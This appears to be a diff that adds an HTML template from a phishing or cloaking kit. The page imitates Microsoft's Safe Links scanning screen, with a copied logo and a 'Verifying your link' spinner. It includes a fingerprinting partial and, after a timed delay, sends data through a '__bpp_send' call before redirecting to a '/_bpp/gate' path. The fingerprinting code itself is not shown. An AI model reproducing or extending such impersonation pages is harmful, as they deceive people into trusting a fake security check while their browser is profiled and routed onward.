@@ -1,0 +1,60 @@
+<!-- BPP-Template
+name: Microsoft Safe Links
+description: ATP Safe Links scanning interstitial with spinner animation
+-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>{{ brand }} Link Protection</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box }
+    body {
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+      background: #f3f3f3;
+      display: flex; align-items: center; justify-content: center;
+      min-height: 100vh; color: #323130;
+    }
+    .card {
+      background: #fff; border-radius: 8px;
+      box-shadow: 0 2px 12px rgba(0,0,0,.08);
+      padding: 48px 36px; text-align: center;
+      max-width: 440px; width: 92%;
+    }
+    .logo { width: 108px; height: auto; margin-bottom: 24px }
+    h1 { font-size: 20px; font-weight: 600; margin-bottom: 8px }
+    p { font-size: 14px; color: #605e5c; line-height: 1.5 }
+    .ring {
+      margin: 28px auto 12px; width: 36px; height: 36px;
+      border: 3px solid #edebe9; border-top-color: #0078d4;
+      border-radius: 50%; animation: spin .9s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg) } }
+    .foot { margin-top: 28px; font-size: 11px; color: #a19f9d }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 23 23">
+      <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
+      <rect x="12" y="1" width="10" height="10" fill="#7fba00"/>
+      <rect x="1" y="12" width="10" height="10" fill="#00a4ef"/>
+      <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
+    </svg>
+    <h1>Verifying your link&hellip;</h1>
+    <p>This link is being scanned to ensure it is safe.<br>Please wait a moment.</p>
+    <div class="ring"></div>
+    <div class="foot">{{ brand }} Safe Links&trade; Protection</div>
+  </div>
+  {% include '_fingerprint.html' %}
+  <script>
+    setTimeout(function() {
+      window.__bpp_send(function() {
+        window.location.href = "/_bpp/gate";
+      });
+    }, 3500);
+  </script>
+</body>
+</html>
